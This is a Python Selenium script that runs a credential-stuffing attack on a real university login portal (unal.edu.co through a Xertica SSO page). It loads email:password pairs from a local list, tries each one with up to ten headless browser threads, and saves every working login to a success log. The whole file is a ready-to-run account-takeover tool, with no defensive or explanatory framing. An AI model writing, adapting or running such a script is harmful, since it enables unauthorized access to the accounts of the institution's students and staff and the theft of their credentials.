
import time
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from pathlib import Path

# Load credentials
# Ensure the path to your credentials file is correct
with open("C:/Users/anhtu/Downloads/acceducolumbia.txt", "r", encoding="utf-8") as f:
    accounts = [line.strip().split(":", 1) for line in f if ":" in line]

# Define the login URL
login_url = "https://smartkey.xertica.com/cloudkey/a/unal.edu.co/user/login?error=true"

def check_login(email, password, thread_id):
    username_only = email.split("@")[0]
    print(f"[Thread {thread_id}] Trying {email}...")

    options = Options()
    options.add_argument("--headless=new")
    driver = webdriver.Chrome(options=options)

    try:
        driver.get(login_url)
        time.sleep(2)

        driver.find_element(By.ID, "username").send_keys(username_only)
        driver.find_element(By.ID, "password").send_keys(password)
        driver.find_element(By.XPATH, '//*[@id="formAuthentication"]/div[3]/div[2]/button[1]').click()
        time.sleep(3)

        try:
            driver.find_element(By.ID, "user.errors")
            print(f"[Thread {thread_id}] ❌ Login failed: {email}")
        except NoSuchElementException:
            print(f"[Thread {thread_id}] ✅ Login SUCCESS: {email}")
            with open("login_success_log.txt", "a", encoding="utf-8") as log_file:
                log_file.write(f"{email}:{password}\n")

    except Exception as e:
        print(f"[Thread {thread_id}] ⚠️ Error with {email}: {e}")
    finally:
        driver.quit()

def run_multithreaded_check(max_threads=10):
    threads = []
    for idx, (email, password) in enumerate(accounts):
        t = threading.Thread(target=check_login, args=(email, password, idx + 1))
        threads.append(t)
        t.start()

        while threading.active_count() > max_threads:
            time.sleep(0.5)

    for t in threads:
        t.join()

if __name__ == "__main__":
    run_multithreaded_check(max_threads=10)
